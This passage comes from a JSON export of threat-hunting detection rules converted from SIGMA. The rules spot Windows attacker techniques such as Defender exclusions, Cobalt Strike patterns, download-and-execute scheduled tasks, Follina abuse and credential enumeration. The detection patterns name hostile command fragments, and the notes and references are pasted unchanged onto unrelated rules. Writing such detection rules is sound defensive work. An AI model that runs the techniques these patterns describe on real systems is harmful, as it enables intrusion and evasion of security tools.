            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\regsvr32.exe\" and (tgt.process.cmdline contains \" -i:\" or tgt.process.cmdline contains \" /i:\" or tgt.process.cmdline contains \" \u2013i:\" or tgt.process.cmdline contains \" \u2014i:\" or tgt.process.cmdline contains \" \u2015i:\")) and (not tgt.process.cmdline contains \" -n \" or tgt.process.cmdline contains \" /n \" or tgt.process.cmdline contains \" \u2013n \" or tgt.process.cmdline contains \" \u2014n \" or tgt.process.cmdline contains \" \u2015n \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 954
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of \"reg.exe\" to add Defender folder exclusions. Qbot has been seen using this technique to add exclusions for folders within AppData and ProgramData.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" or tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\") and (tgt.process.cmdline contains \"ADD \" and tgt.process.cmdline contains \"/t \" and tgt.process.cmdline contains \"REG_DWORD \" and tgt.process.cmdline contains \"/v \" and tgt.process.cmdline contains \"/d \" and tgt.process.cmdline contains \"0\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 955
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1098"
            ],
            "name": "User Added to Local Administrators Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \" administrators \" or tgt.process.cmdline contains \" administrateur\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 956
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Start of NT Virtual DOS Machine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ntvdm.exe\" or tgt.process.image.path contains \"\\csrstub.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 957
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential process patterns related to Cobalt Strike beacon activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential CobaltStrike Process Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cmd.exe /C whoami\" and src.process.image.path contains \"C:\\Temp\\\") or ((src.process.image.path contains \"\\runonce.exe\" or src.process.image.path contains \"\\dllhost.exe\") and (tgt.process.cmdline contains \"cmd.exe /c echo\" and tgt.process.cmdline contains \"> \\\\.\\pipe\")) or ((src.process.cmdline contains \"cmd.exe /C echo\" and src.process.cmdline contains \" > \\\\.\\pipe\") and tgt.process.cmdline contains \"conhost.exe 0xffffffff -ForceV1\") or (src.process.cmdline contains \"/C whoami\" and tgt.process.cmdline contains \"conhost.exe 0xffffffff -ForceV1\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 958
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"runexehelper.exe\" binary as a proxy to launch other programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Lolbin Runexehelper Use As Proxy",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\runexehelper.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 959
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Command Patterns In Scheduled Task Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (((tgt.process.cmdline contains \"/sc minute \" or tgt.process.cmdline contains \"/ru system \") and (tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd /r\" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \")) or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -w hidden \" or tgt.process.cmdline contains \" bypass \" or tgt.process.cmdline contains \" IEX\" or tgt.process.cmdline contains \".DownloadData\" or tgt.process.cmdline contains \".DownloadFile\" or tgt.process.cmdline contains \".DownloadString\" or tgt.process.cmdline contains \"/c start /min \" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"mshta http\" or tgt.process.cmdline contains \"mshta.exe http\") or ((tgt.process.cmdline contains \":\\ProgramData\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Tmp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\\" or tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Temp%\" or tgt.process.cmdline contains \"%tmp%\") and (tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"curl\" or tgt.process.cmdline contains \"wscript\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 960
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "REGISTER_APP.VBS Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\register_app.vbs\" and tgt.process.cmdline contains \"-register\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 961
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1216"
            ],
            "name": "Execute Code with Pester.bat",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Pester\" and tgt.process.cmdline contains \"Get-Help\")) or ((tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"pester\" and tgt.process.cmdline contains \";\")) and (tgt.process.cmdline contains \"help\" or tgt.process.cmdline contains \"?\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 962
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Base64 Encoded MpPreference Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"QWRkLU1wUHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"FkZC1NcFByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"BZGQtTXBQcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"U2V0LU1wUHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"NldC1NcFByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"TZXQtTXBQcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"YWRkLW1wcHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"FkZC1tcHByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"hZGQtbXBwcmVmZXJlbmNlI\" or tgt.process.cmdline contains \"c2V0LW1wcHJlZmVyZW5jZS\" or tgt.process.cmdline contains \"NldC1tcHByZWZlcmVuY2Ug\" or tgt.process.cmdline contains \"zZXQtbXBwcmVmZXJlbmNlI\") or (tgt.process.cmdline contains \"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\" or tgt.process.cmdline contains \"cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\" or tgt.process.cmdline contains \"MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\" or tgt.process.cmdline contains \"zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 963
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute Pcwrun.EXE To Leverage Follina",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\pcwrun.exe\" and tgt.process.cmdline contains \"../\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 964
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Webshell Tool Reconnaissance Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_tomcatservice.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (tgt.process.cmdline contains \"CATALINA_HOME\" or tgt.process.cmdline contains \"catalina.jar\"))) and (tgt.process.cmdline contains \"perl --help\" or tgt.process.cmdline contains \"perl -h\" or tgt.process.cmdline contains \"python --help\" or tgt.process.cmdline contains \"python -h\" or tgt.process.cmdline contains \"python3 --help\" or tgt.process.cmdline contains \"python3 -h\" or tgt.process.cmdline contains \"wget --help\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 965
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using WorkFolders.exe to execute an arbitrary control.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execution via WorkFolders.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\control.exe\" and src.process.image.path contains \"\\WorkFolders.exe\") and (not tgt.process.image.path=\"C:\\Windows\\System32\\control.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 966
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Direct Autorun Keys Modification",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and tgt.process.cmdline contains \"add\") and (tgt.process.cmdline contains \"\\software\\Microsoft\\Windows\\CurrentVersion\\Run\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" or tgt.process.cmdline contains \"\\software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" or tgt.process.cmdline contains \"\\system\\CurrentControlSet\\Control\\SafeBoot\\AlternateShell\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 967
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential PowerShell Downgrade Attack",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \" -version 2 \" or tgt.process.cmdline contains \" -versio 2 \" or tgt.process.cmdline contains \" -versi 2 \" or tgt.process.cmdline contains \" -vers 2 \" or tgt.process.cmdline contains \" -ver 2 \" or tgt.process.cmdline contains \" -ve 2 \" or tgt.process.cmdline contains \" -v 2 \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 968
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects processes that query known 3rd party registry keys that holds credentials via commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Enumeration for 3rd Party Creds From CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
